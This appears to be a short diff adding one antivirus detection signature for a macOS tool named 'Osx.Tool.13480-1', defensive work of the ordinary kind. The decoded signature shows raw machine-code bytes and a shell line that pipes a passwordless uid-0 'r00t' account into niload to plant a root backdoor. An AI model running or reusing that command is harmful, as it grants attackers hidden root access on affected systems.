@@ -1,0 +1,7 @@
+VIRUS NAME: Osx.Tool.13480-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+|¥*y@‚ÿı}H¦;êp9`p9ÿ|¨)®8ÿ8€8 ÿÿ8ş•Dÿÿ````8Ÿÿ8«şå8ş”Dÿÿ````8ş–Dÿÿ````|¥*y8ÿaÿø¡ÿü8ÿø8şËDÿÿ````8ş‘Dÿÿ/tmp/x.shX#!/bin/sh
+/bin/echo 'r00t::999:80::0:0:r00t:/:/bin/sh' | /usr/bin/niload -m passwd .
+
